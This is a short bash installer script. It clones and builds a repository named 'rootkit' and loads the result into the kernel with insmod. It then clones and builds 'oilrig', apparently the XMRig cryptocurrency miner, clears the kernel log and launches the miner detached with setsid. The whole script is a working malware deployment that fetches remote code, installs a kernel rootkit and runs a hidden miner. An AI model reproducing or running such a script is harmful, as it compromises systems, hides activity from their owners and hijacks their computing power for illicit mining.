#!/bin/bash

echo " starting install root "
echo " cloning "
git clone https://github.com/VYOM00907/rootkit
echo " building "
cd rootkit/
make
echo "successfully completed installation"

echo "installing xm"
echo "installing dependencies"
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
echo "downloading..."
git clone https://github.com/VYOM00907/oilrig
echo "building"
mkdir oilrig/build && cd oilrig/build
cmake ..
make -j$(nproc)
echo "installed"

echo "launcher started "

echo "loading module"
dmesg -C 
insmod rootkit.ko
dmesg 
echo "done loading module"
xmrig 

setsid xmrig 

echo "done launching "